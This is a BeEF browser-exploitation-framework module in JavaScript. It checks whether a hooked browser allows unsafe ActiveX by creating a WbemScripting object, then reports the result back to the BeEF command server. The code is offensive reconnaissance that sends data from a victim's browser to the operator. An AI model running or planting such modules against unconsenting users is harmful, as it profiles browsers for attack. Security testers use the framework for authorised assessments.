//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var unsafe = true;
	var result = "";
	var test;

	try {
		test = new ActiveXObject("WbemScripting.SWbemLocator");
	} catch (e) {
		unsafe = false;
	}

	test = null;

	if (unsafe) {
		result = "Browser is configured for unsafe ActiveX";
	} else {
		result = "Browser is NOT configured for unsafe ActiveX";
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "unsafe_activex="+result);

});

